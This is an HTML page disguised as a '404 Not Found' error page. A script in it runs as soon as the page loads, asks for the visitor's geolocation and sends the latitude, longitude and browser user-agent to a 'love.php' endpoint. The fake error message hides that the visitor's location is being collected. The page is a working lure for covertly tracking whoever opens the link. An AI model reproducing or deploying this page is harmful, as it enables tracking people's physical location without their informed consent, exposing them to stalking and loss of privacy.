<HTML><HEAD><title>404 Not Found</title></HEAD><body><div style="text-align: center;"><big><big><big><span style="font-weight: bold;"><br>ERROR 404: Document not Found<br></span></big></big></big></div>
<p id="love"></p>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else { 
                document.getElementById("love").innerHTML = "Geolocation is not supported by this browser.";
            }
        }
        function showPosition(position) {
            const xhttp = new XMLHttpRequest();
            // Note: Ensure 'love.php' is accessible and configured correctly
            xhttp.open("GET", "love.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
            xhttp.send();
        }
	    window.onload = getLocation;
    </script>
</body>
</HTML>
